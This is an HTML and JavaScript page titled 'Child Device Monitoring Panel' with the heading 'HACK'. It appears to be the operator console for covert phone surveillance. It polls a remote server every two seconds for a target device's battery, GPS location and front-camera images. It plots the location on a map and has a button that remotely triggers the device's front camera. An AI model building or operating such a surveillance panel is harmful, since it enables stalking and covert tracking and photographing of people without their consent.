<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Child Device Monitoring Panel</title>
<style>
  body { font-family: Arial, sans-serif; background: #111; color: #fff; padding: 20px; }
  table { width: 100%; border-collapse: collapse; margin-top: 20px; }
  th, td { padding: 10px; border: 1px solid #555; text-align: center; }
  th { background: #222; }
  #map { width: 100%; height: 400px; margin-top: 20px; border: 1px solid #555; }
  #cameraImage { width: 300px; margin-top: 20px; border: 1px solid #555; display:block;}
  button { padding:10px 15px; margin-top:10px; cursor:pointer; background:#222; color:#fff; border:none; }
</style>
</head>
<body>
<h1>HACK</h1>

<table>
  <thead>
    <tr>
      <th>Device ID</th>
      <th>Battery</th>
      <th>Location</th>
      <th>Status</th>
      <th>Last Update</th>
    </tr>
  </thead>
  <tbody id="deviceData">
    <tr><td colspan="5">Loading...</td></tr>
  </tbody>
</table>

<div id="map"></div>

<button onclick="captureCamera()">Capture Front Camera</button>
<img id="cameraImage" src="" alt="Front Camera Image" />

<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY"></script>
<script>
const DEVICE_ID = "12345";
const SERVER_URL = "https://hack-7tdp.onrender.com/api/device/" + DEVICE_ID;
let map, marker;

function initMap(lat = 0, lng = 0) {
    const loc = { lat: lat, lng: lng };
    map = new google.maps.Map(document.getElementById("map"), { zoom: 12, center: loc });
    marker = new google.maps.Marker({ position: loc, map: map });
}

async function fetchDeviceData() {
    try {
        const res = await fetch(SERVER_URL);
        if (!res.ok) throw new Error("Device not found");
        const data = await res.json();

        document.getElementById("deviceData").innerHTML = `
            <tr>
                <td>${DEVICE_ID}</td>
                <td>${data.battery}</td>
                <td>${data.location}</td>
                <td>${data.status}</td>
                <td>${new Date(data.lastUpdate).toLocaleString()}</td>
            </tr>
        `;

        if (data.location && data.location !== "Not fetched") {
            const [lat, lng] = data.location.split(",").map(Number);
            const loc = { lat: lat, lng: lng };
            if (!map) initMap(lat, lng);
            marker.setPosition(loc);
            map.setCenter(loc);
        }

        if(data.cameraImage) {
            document.getElementById("cameraImage").src = "data:image/jpeg;base64," + data.cameraImage;
        }

    } catch (err) {
        document.getElementById("deviceData").innerHTML = `<tr><td colspan="5">Error fetching data</td></tr>`;
        console.error(err);
    }
}

// Fetch every 2 seconds
fetchDeviceData();
setInterval(fetchDeviceData, 2000);

// Capture front camera button click
function captureCamera() {
    fetch("https://hack-7tdp.onrender.com/api/device/12345/camera-trigger", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ deviceId: DEVICE_ID })
    }).then(res => res.json())
    .then(data => console.log("Camera trigger sent"))
    .catch(err => console.error(err));
}
</script>

</body>
</html>
